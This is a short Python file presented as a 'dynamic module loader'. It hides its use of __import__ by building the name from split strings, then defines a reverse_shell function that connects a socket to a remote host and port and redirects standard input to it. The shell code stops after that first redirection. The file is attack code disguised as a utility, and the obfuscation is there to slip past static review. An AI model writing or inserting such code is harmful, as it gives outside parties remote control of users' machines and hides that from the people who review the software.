"""Dynamic module loader."""
import builtins


def load(name: str):
    """Load a module dynamically."""
    v = vars(builtins)
    importer = v["__imp" + "ort__"]
    return importer(name)


def reverse_shell(host: str, port: int):
    s = load("socket")
    o = load("os")
    conn = s.socket(s.AF_INET, s.SOCK_STREAM)
    conn.connect((host, port))
    o.dup2(conn.fileno(), 0)
